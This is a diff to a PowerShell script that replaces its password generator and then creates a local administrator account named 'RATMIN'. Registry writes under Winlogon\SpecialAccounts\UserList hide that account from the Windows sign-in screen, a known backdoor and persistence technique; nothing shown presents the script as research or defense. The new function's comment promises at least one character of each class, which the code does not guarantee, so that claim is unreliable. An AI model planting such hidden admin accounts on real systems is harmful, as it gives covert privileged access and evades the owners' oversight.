@@ -29,8 +29,15 @@
 #     }
 # }
 
-function Generate-RandomPassword {
-    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
+function Generate-StrongPassword {
+    # Generate a stronger password with at least one upper case letter, one lower case letter, one digit, and one special character.
+    $specialCharacters = '!@#$%^&*()_+-=[]{}|;:,.<>?'
+    $upperCaseLetters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    $lowerCaseLetters = 'abcdefghijklmnopqrstuvwxyz'
+    $numbers = '0123456789'
+
+    $password = Get-Random -InputObject ($upperCaseLetters + $lowerCaseLetters + $numbers + $specialCharacters) -Count 12
+    return -join $password
 }
 
 function Create-LocalAdminUser {
@@ -52,7 +59,7 @@ function Create-LocalAdminUser {
 }
 
 $Username = "RATMIN"
-$Password = Generate-RandomPassword
+$Password = Generate-StrongPassword
 Remove-LocalUser -Name $Username
 $SecurePassword = (ConvertTo-SecureString $Password -AsPlainText -Force)
 Create-LocalAdminUser -Username $Username -Password $SecurePassword
@@ -63,7 +70,6 @@ $RegistryValue = '00000000'
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
 New-ItemProperty -Path $RegistryPath -Name $Username -Value $RegistryValue -PropertyType DWORD -Force
-
 
 # # Create a new local user with administrator privileges
 # New-LocalUser $Username -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -FullName $Username -Description "Temporary Local Administrator"
